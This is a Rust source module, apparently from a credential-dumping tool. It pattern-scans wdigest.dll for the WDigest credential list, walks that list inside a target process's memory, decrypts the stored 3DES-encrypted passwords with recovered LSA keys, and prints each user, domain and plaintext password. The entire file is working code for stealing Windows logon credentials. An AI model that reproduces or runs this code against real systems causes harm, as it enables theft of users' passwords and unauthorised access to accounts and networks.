//! WDigest provider plaintext-password recovery.
//!
//! `wdigest.dll` keeps a linked list whose entries embed a 3DES-encrypted
//! copy of the user's password. Pattern-scan locally to recover the list
//! head's RIP-relative reference, then walk it in the target process and
//! decrypt with the LSA 3DES key already recovered for the LogonSession dump.

use crate::MemReader;
use crate::lsa::{self, LsaKeys};
use crate::pe;

const WDIGEST: &str = "wdigest.dll";

/// `cmp rbx, rcx ; je …` — a stable marker right after the list-head load.
const LIST_HEAD_SIG: &[u8] = &[0x48, 0x3b, 0xd9, 0x74];

// ─── Locate the list head ─────────────────────────────────────────────────

/// Resolve the local-process VA of WDigest's credential list head.
pub fn locate_list_head_local() -> Result<u64, String> {
    pe::ensure_loaded(WDIGEST)?;
    let base = pe::local_base(WDIGEST)?;
    let text = pe::text_section(base)?;

    let off = pe::find_pattern(text, LIST_HEAD_SIG)
        .ok_or("WDigest list-head pattern not found")?;

    // The disp32 we want sits *immediately before* the matched bytes.
    unsafe {
        let p   = text.as_ptr().add(off);
        let rip = u32::from_le_bytes([*p.offset(-4), *p.offset(-3), *p.offset(-2), *p.offset(-1)]);
        Ok((p as u64).wrapping_add(rip as u64))
    }
}

/// Resolve WDigest's *remote* list head VA by rebasing the local match.
pub fn locate_list_head_remote(
    reader_local_va:   u64,
    reader_remote_va:  u64,
    local_list_head:   u64,
) -> u64 {
    reader_remote_va + (local_list_head - reader_local_va)
}

/// Walk the WDigest credential list and print decrypted plaintext passwords.
pub fn dump(reader: &impl MemReader, list_head: u64, keys: &LsaKeys) {
    let mut entry = reader.read_u64(list_head);
    let mut idx   = 0u32;

    while entry != 0 && entry != list_head {
        idx += 1;
        let user   = reader.read_unicode_string(entry + 0x30);
        let domain = reader.read_unicode_string(entry + 0x40);

        println!("\n[{idx:04}] WDigest @ 0x{entry:016X}");
        println!("  User   : {}", display_or_null(&user));
        println!("  Domain : {}", display_or_null(&domain));

        // UNICODE_STRING-like header at +0x50: { Length, MaxLength, _, Buffer }
        let hdr = reader.read_bytes(entry + 0x50, 16);
        if hdr.len() >= 16 {
            let max_len = u16::from_le_bytes([hdr[2], hdr[3]]) as usize;
            let buf_va  = u64::from_le_bytes(hdr[8..16].try_into().unwrap());

            if !user.is_empty() && !domain.is_empty() && max_len != 0 && buf_va != 0 {
                let cipher = reader.read_bytes(buf_va, max_len);
                let line = match lsa::bcrypt_3des_decrypt(&keys.des3_key, &keys.iv, &cipher) {
                    Some(plain) => {
                        let end = plain.chunks_exact(2)
                            .position(|c| c[0] == 0 && c[1] == 0)
                            .map(|p| p * 2)
                            .unwrap_or(plain.len());
                        let utf16: Vec<u16> = plain[..end].chunks_exact(2)
                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
                            .collect();
                        let pw = String::from_utf16_lossy(&utf16);

                        if user.ends_with('$') {
                            // Machine account — display first 32 bytes hex
                            let mut s = String::from("(hex) ");
                            for b in &plain[..plain.len().min(32)] {
                                s.push_str(&format!("{b:02x}"));
                            }
                            s
                        } else if pw.is_empty() {
                            "(null)".to_string()
                        } else {
                            pw
                        }
                    }
                    None => "(decrypt failed)".to_string(),
                };
                println!("  Pass   : {line}");
            } else {
                println!("  Pass   : (null)");
            }
        }

        let next = reader.read_u64(entry);
        if next == entry { break; }
        entry = next;
        if idx > 500 { break; }
    }
}

fn display_or_null(s: &str) -> &str {
    if s.is_empty() { "(null)" } else { s }
}
